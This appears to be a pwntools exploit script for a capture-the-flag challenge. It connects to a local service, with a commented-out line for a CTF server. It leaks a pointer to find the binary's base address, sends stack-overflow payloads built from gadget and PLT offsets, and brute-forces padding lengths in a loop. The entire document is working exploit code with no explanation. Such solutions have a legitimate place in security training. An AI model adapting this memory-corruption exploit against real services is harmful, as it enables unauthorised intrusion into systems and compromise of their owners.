import time

from pwn import *

for i in range(400, 465):
    print("TRYING:", i)
    io = remote("localhost", 1337)
    #io = remote("pwn.zh3r0.cf", 1111)
    io.recv(1024)

    io.send("AAAAAAAABBBBBBBB")
    res = io.recv(1024)
    print(res)

    leak = u64(res.split(b"AAAAAAAABBBBBBBB")[1].split(b"\n")[0].ljust(8, b"\x00"))
    bin_base = leak - 0x8b8
    main_plt = p64(bin_base + 0x884)
    stack_gadget = p64(bin_base + 0x92c)
    loop = p64(bin_base + 0x840)

    for _ in range(2):
        payload = b"A" * 0x28
        payload += stack_gadget
        payload += main_plt * 10
        io.sendline(payload)
        print(io.recv(1024))

        io.send("AAAAAAAABBBBBBBB")
        res = io.recv(1024)
        print(res)

    payload = b"A" * 0x28
    payload += loop
    payload += b"A" * i 
    io.send(payload)
    print(io.recv(1024))
    
    time.sleep(0.15)
    io.close()
    print()
